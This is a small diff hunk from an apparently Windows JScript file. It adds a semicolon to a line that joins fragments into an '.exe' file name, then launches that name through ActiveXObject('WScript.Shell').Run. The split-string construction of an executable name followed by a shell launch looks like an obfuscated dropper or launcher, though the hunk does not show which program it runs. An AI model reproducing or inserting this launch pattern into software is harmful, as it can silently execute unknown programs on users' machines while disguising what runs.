@@ -21,7 +21,7 @@
       	   		var c = '.';
       	   		var d = 'exe';
       	   		
-      	   		var suma = a + b + c + d  
+      	   		var suma = a + b + c + d ;
       	   		
 			var r = new ActiveXObject("WScript.Shell").Run(suma);	
 	
